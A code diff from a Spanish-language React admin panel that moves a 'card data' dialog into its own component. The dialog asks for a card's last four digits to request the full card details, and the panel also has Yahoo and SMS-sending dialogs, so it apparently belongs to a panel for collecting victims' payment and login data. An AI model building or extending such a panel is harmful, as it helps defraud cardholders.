@@ -1107,69 +1107,11 @@ export default function AdminPanel() {
         onClose={closeModal} 
         onConfirm={handleYahooModalConfirm} 
       />
-      <Dialog open={activeModal === 'datos_tarjeta'} onOpenChange={(open) => !open && closeModal()}>
-        <DialogContent className="sm:max-w-[425px] bg-[#1e1e1e] text-white border-gray-700">
-          <DialogHeader>
-            <DialogTitle className="flex items-center">
-              <CreditCard className="mr-2 h-5 w-5" />
-              Datos de Tarjeta
-            </DialogTitle>
-            <DialogDescription className="text-gray-400">
-              Ingresa la terminación de la tarjeta para solicitar los datos completos.
-            </DialogDescription>
-          </DialogHeader>
-          
-          <div className="grid gap-4 py-4">
-            <div className="grid grid-cols-4 items-center gap-4">
-              <Label htmlFor="terminacion" className="text-right">
-                Terminación
-              </Label>
-              <Input
-                id="terminacion"
-                type="text"
-                placeholder="4 últimos dígitos"
-                className="col-span-3 bg-[#2a2a2a] border-gray-700 text-white"
-                maxLength={4}
-                onChange={(e) => {
-                  // Solo permitir números y limitar a 4 dígitos
-                  const value = e.target.value.replace(/\D/g, '').slice(0, 4);
-                  e.target.value = value;
-                }}
-              />
-            </div>
-          </div>
-          
-          <DialogFooter>
-            <Button
-              type="button"
-              variant="outline"
-              onClick={closeModal}
-              className="border-gray-700 text-gray-300 hover:bg-gray-800"
-            >
-              Cancelar
-            </Button>
-            <Button
-              type="button"
-              onClick={() => {
-                const terminacion = (document.getElementById('terminacion') as HTMLInputElement).value;
-                if (terminacion && terminacion.length === 4) {
-                  handleDatosTarjetaConfirm({ terminacion });
-                } else {
-                  toast({
-                    title: "Error de validación",
-                    description: "Ingrese exactamente 4 dígitos para la terminación de la tarjeta",
-                    variant: "destructive"
-                  });
-                }
-              }}
-              className="bg-[#007bff] hover:bg-blue-700 text-white flex items-center"
-            >
-              <CreditCard className="h-4 w-4 mr-2" />
-              Solicitar datos
-            </Button>
-          </DialogFooter>
-        </DialogContent>
-      </Dialog>
+      <DatosTarjetaModal
+        isOpen={activeModal === 'datos_tarjeta'}
+        onClose={closeModal}
+        onConfirm={handleDatosTarjetaConfirm}
+      />
       
       {/* Diálogo para enviar SMS */}
       <Dialog open={isSmsSendDialogOpen} onOpenChange={setIsSmsSendDialogOpen}>
